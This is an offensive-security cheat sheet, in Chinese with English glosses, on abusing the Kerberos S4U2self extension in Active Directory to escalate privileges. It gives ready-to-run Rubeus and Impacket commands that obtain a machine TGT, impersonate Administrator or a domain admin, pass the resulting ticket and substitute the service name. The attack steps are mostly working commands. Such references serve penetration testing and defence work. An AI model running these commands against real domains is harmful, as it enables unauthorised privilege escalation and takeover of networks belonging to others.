# Kerberos - S4U 扩展 (Service for User Extension)

* **Service For User To Self (S4U2self)** 允许服务代表另一个用户获取 TGS。
* **Service For User To Proxy (S4U2proxy)** 允许服务代表另一个用户在另一个服务上获取 TGS。

## S4U2self - 权限提升 (Privilege Escalation)

1. 获取一个 TGT (Get a TGT)
    * 使用非约束委派 (Using Unconstrained Delegation)
    * 使用当前机器帐户: `Rubeus.exe tgtdeleg /nowrap`
    * 使用凭证: `getTGT.py -dc-ip "$DC_IP" -hashes :"$NT_HASH" "$DOMAIN"/"machine$"`
2. 使用该 TGT 发起 S4U2self 请求，以便作为域管理员获取该机器的服务票据。 (Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.)

    ```ps1
    # Windows
    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001.domain.local" /ticket:"base64ticket"
    Rubeus.exe ptt /ticket:"base64ticket"

    Rubeus.exe s4u /self /nowrap /impersonateuser:"Administrator" /altservice:"cifs/srv001" /ticket:"base64ticket" /ptt

    # Linux
    export KRB5CCNAME="/path/to/ticket.ccache"
    getST.py -self -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" -k -no-pass -dc-ip "DomainController" "domain.local"/'machine$'
    ```

就 Active Directory 而言，"Network Service" (网络服务) 帐户和 AppPool (应用程序池) 身份可以充当计算机帐户，它们仅在本地受到限制。因此，如果你作为这些身份之一运行，就有可能调用 S4U2self 并为任何用户（例如具有本地管理员权限的用户，如 DA）向你自己请求服务票据。

```ps1
# 尝试执行 S4UProxy 步骤时，Rubeus 执行将会失败，但会打印 S4USelf 生成的票据。
Rubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap
# 服务名不包含在 TGS 加密数据中，可被随意修改。
Rubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt
```

## 参考资料 (References)

* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
* [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
* [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
